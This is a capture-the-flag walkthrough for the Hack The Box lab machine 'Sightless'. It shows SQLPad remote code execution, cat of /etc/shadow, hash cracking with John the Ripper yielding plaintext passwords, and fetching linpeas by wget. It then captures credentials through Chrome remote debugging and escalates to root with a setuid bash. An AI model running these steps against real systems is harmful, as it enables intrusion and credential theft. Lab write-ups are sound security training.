@@ -1,0 +1,316 @@
+---
+title: "HTB: Sightless"
+date: 2024-12-04
+description: "Sightless is a box that consist of exploiting SQLPad and Froxlor application to compromise the machine."
+draft: false
+---
+
+## Initial Foothold
+
+As always let's start with running a nmap scan on the machine to search for open ports. 
+
+```
+~/HTB/Sightless ❯ nmap --min-rate 100000 -sV -sC 10.129.199.225 -o nmap.result
+Starting Nmap 7.95 ( https://nmap.org ) at 2024-12-04 09:59 CET
+Nmap scan report for 10.129.199.225
+Host is up (0.11s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+| fingerprint-strings:
+|   GenericLines:
+|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.199.225]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
+|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://sightless.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.95%I=7%D=12/4%Time=675019FB%P=arm-apple-darwin24.0.0%r(G
+SF:enericLines,A3,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20
+SF:Server\)\x20\[::ffff:10\.129\.199\.225\]\r\n500\x20Invalid\x20command:\
+SF:x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20tr
+SF:y\x20being\x20more\x20creative\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 91.02 seconds
+```
+
+The nmap result doesn't show any special ports open so it seems as we will need to exploit the web application for initial foothold. To access the web application add `sightless.htb` to `/etc/hosts` file.
+
+```bash
+##
+# Host Database
+#
+# localhost is used to configure the loopback interface
+# when the system is booting.  Do not change this entry.
+##
+127.0.0.1	localhost
+255.255.255.255	broadcasthost
+::1             localhost
+10.129.199.225	sightless.htb
+```
+
+The web application has a interesting subdomain on the our services section of the page. The subdomain is the following `sqlpad.sightless.htb`.
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-1.png" />
+
+We will need to add `sqlpad.sightless.htb` to our `/etc/hosts` file to access the subdomain web application. Here's a overview of my `/etc/hosts` file.
+
+```bash
+##
+# Host Database
+#
+# localhost is used to configure the loopback interface
+# when the system is booting.  Do not change this entry.
+##
+127.0.0.1	localhost
+255.255.255.255	broadcasthost
+::1             localhost
+10.129.199.225	sightless.htb sqlpad.sightless.htb
+```
+
+We successfully managed to acces the `sqlpad.sightless.htb` application. The version of SQLPad the web application is running is `6.10.0` which is a interesting information.
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-2.png" />
+
+According to multiple of sources the SQLPad version 6.10.0 is vulnerable for remote code execution. I decided to use the following exploit on the machine [SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944) to potentially get a remote code execution on the machine.
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-3.png" />
+
+Success! We finally have a remote code execution on the machine. However, it seems as we are inside a docker container as we are logged in as root instead of www-data or a user.
+
+## Road To User
+
+We are currently logged in as root inside a docker container which means we need to try to escape the docker container. Let's start off by reading files such as `/etc/passwd` and `/etc/shadow`.
+
+```bash
+# Overview of `/etc/passwd` file.
+root@c184118df0a6:/var/lib/sqlpad# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+michael:x:1001:1001::/home/michael:/bin/bash
+
+# Overview of `/etc/shadow` file.
+root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
+root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
+daemon:*:19051:0:99999:7:::
+bin:*:19051:0:99999:7:::
+sys:*:19051:0:99999:7:::
+sync:*:19051:0:99999:7:::
+games:*:19051:0:99999:7:::
+man:*:19051:0:99999:7:::
+lp:*:19051:0:99999:7:::
+mail:*:19051:0:99999:7:::
+news:*:19051:0:99999:7:::
+uucp:*:19051:0:99999:7:::
+proxy:*:19051:0:99999:7:::
+www-data:*:19051:0:99999:7:::
+backup:*:19051:0:99999:7:::
+list:*:19051:0:99999:7:::
+irc:*:19051:0:99999:7:::
+gnats:*:19051:0:99999:7:::
+nobody:*:19051:0:99999:7:::
+_apt:*:19051:0:99999:7:::
+node:!:19053:0:99999:7:::
+michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
+```
+
+We have successfully obtained password hases from the server. Let's try cracking these passwords using the following commands.
+
+```
+# Unshadowing passwd and shadow file 
+~/HTB/Sightless ❯ unshadow passwd.txt shadow.txt > unshadowed.txt
+
+# Reading unshadowed.txt file
+~/HTB/Sightless ❯ cat unshadowed.txt
+root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:0:0:root:/root:/bin/bash
+daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:*:2:2:bin:/bin:/usr/sbin/nologin
+sys:*:3:3:sys:/dev:/usr/sbin/nologin
+sync:*:4:65534:sync:/bin:/bin/sync
+games:*:5:60:games:/usr/games:/usr/sbin/nologin
+man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
+news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
+list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:*:100:65534::/nonexistent:/usr/sbin/nologin
+node:!:1000:1000::/home/node:/bin/bash
+michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:1001:1001::/home/michael:/bin/bash
+
+# Cracking the unshadow.txt file using JohnTheRipper
+~/HTB/Sightless ❯ john --wordlist=rockyou.txt unshadowed.txt
+Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
+Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+blindside        (root)
+insaneclownposse (michael)
+2g 0:00:01:38 DONE (2024-12-04 10:57) 0.02023g/s 621.7p/s 1036c/s 1036C/s Whitney..simone13
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+We successfully managed to crack the password of michael which means we can now try to login as michael using SSH.
+
+```
+~/HTB/Sightless ❯ ssh michael@sightless.htb
+michael@sightless:~$ whoami
+michael
+michael@sightless:~$ hostname
+sightless
+michael@sightless:~$ pwd
+/home/michael
+michael@sightless:~$ cat /home/michael/user.txt
+0f8512d7710e0ff2e56bb0fcc3210742
+```
+
+Success! We managed to login as michael and read the `user.txt` flag.
+
+## Road To Root 
+
+Now since we are logged in as michael we can transfer over `linpeas.sh` over to the machine and try to elevate our privileges.
+
+```
+michael@sightless:~$ wget http://10.10.16.9/linpeas.sh
+michael@sightless:~$ chmod +x linpeas.sh
+michael@sightless:~$ ./linpeas.sh
+...
+root        1155  0.0  0.1  10340  4136 ?        S    08:57   0:00  _ /usr/sbin/CRON -f -P
+john        1188  0.0  0.0   2892   996 ?        Ss   08:57   0:00      _ /bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py
+john        1584  0.0  0.6  33660 24392 ?        S    08:59   0:02          _ /usr/bin/python3 /home/john/automation/administration.py
+john        1585  0.3  0.3 33630172 15284 ?      Sl   08:59   0:15              _ /home/john/automation/chromedriver --port=44885
+john        1596  0.6  2.8 34011320 112304 ?     Sl   08:59   0:24              |   _ /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.N7obng data:,
+...
+```
+
+That is really interesting, it seems as remote debugging is enabled on Google Chromium. Let's inspect our network and see which port is open for Google Chromium.
+
+```
+michael@sightless:~$ netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:43919         0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:33423         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:44885         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::21                   :::*                    LISTEN      -
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+```
+
+The most suspicious port in my instance is `43919` so I'll try port-forwarding that port using the following command.
+
+```bash
+~ ❯ ssh -L 43919:127.0.0.1:43919 michael@sightless.htb
+...
+michael@sightless:~$
+...
+```
+
+Now let's open Google Chromium and search for `chrome://inspect/devices` and add the following information `127.0.0.1:43919` to Google Chromium.
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-4.png" />
+
+We can now see two different objects which are available for us inside the Google Chromium remote debugger. It seems as the server is also running an application called for Froxlor.
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-5.png" />
+
+Let's try to inspect the Froxlor traffic and see if there is anything interesting inside it. 
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-6.png" />
+
+Interesting, it seems as the remote debugger is automatically logging in and logging out. Which means we might be able to see the password by changing the type of the input box.
+
+```html
+<!-- Original -->
+<input class="form-control" type="password" name="password" id="password" required="">
+
+<!-- Modify -->
+<input class="form-control" name="password" id="password" required="">
+```
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-7.png" />
+
+Success! We successfully managed to view the password by changing the HTML code. Now let's forward the port running on 8080 using the following command.
+
+```bash
+~ ❯ ssh -L 8080:127.0.0.1:8080 michael@sightless.htb
+...
+michael@sightless:~$
+...
+```
+
+Now let's try accessing the Froxlor application running on port 8080 on the server. 
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-8.png" />
+
+I was successfully able to login using the credentials `admin:ForlorfroxAdmin` which we obtained through Google Chromium Remote Debugging.
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-9.png" />
+
+To elevate our privileges we will need to go to PHP -> PHP-FPM versions and change the php-fpm restart command to the following:
+
+<img src="/assets/images/HTB-Sightless/HTB-Sightless-10.png" />
+
+Once the changes are submitted, we can now succesfully login as root using the following command.
+
+```shell
+michael@sightless:~$ ls -la /bin/bash
+-rwsrwsrwt 1 root root 1396520 Mar 14  2024 /bin/bash
+michael@sightless:~$ /bin/bash -p
+bash-5.1# whoami
+root
+bash-5.1# hostname
+sightless
+bash-5.1# cat /root/root.txt
+9e8b7c47d70bc8228a92c2c946cfa82a
+bash-5.1#
+```
+
+We successfully compromised the sightless machine! Hopefully, you learned something out of the article, the sightless box was actually a really interesting box.
+
+
+
